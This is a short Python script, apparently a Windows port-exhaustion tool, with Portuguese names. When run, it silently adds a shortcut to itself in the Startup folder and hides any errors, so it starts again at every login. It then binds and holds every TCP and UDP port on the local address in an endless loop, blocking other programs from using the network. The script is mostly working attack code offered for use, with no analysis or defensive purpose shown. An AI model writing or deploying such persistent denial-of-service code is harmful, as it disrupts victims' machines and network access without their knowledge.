import socket
import subprocess
import winshell
from win32com.client import Dispatch
import os

def iniciar_com_windows():
    caminho_programa = os.path.abspath(__file__)
    pasta_inicializar = winshell.startup()

    atalho = os.path.join(pasta_inicializar, "PortExhaustion.lnk")

    if os.path.exists(atalho):
        return

    shell = Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(atalho)

    shortcut.Targetpath = caminho_programa
    shortcut.WorkingDirectory = os.path.dirname(caminho_programa)
    shortcut.save()

try:
    iniciar_com_windows()
except:
    pass

def detectar_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("192.0.2.1", 80))
        return s.getsockname()[0]
    finally:
        s.close()

ip = detectar_ip()
sockets_abertos = []

print(f"IP local detectado: {ip}")
print("-" * 40)

porta = 1

while porta <= 65535:
    try:
        if porta % 100 == 0:
           novo_ip = detectar_ip()

           if novo_ip != ip:
              ip = novo_ip
              # print(f"IP atualizado: {ip}")

              for sock in sockets_abertos:
                 sock.close()

              sockets_abertos.clear()
            
        # Socket TCP
        sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Socket UDP
        sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # TCP
        try:
            sock_tcp.bind((ip, porta))
            sock_tcp.listen(1)

            sockets_abertos.append(sock_tcp)

            # print(f"[OCUPADA PELO SCRIPT] Porta: {porta} | TCP")

        except OSError:
            sock_tcp.close()
            # print(f"[INDISPONÍVEL] Porta: {porta} | TCP")


        # UDP
        try:
            sock_udp.bind((ip, porta))

            sockets_abertos.append(sock_udp)

            # print(f"[OCUPADA PELO SCRIPT] Porta: {porta} | UDP")

        except OSError:
            sock_udp.close()
            # print(f"[INDISPONÍVEL] Porta: {porta} | UDP")

        if porta >= 65535:
            subprocess.run("cls", shell=True)

            print("-" * 40)
            print(f"Total reservado pelo script: {len(sockets_abertos)}")
            print("Pressione CTRL+C para encerrar.")
            print("-" * 40)

            porta = 1

        porta += 1

    except KeyboardInterrupt:
        print("\nEncerrando...")
        break
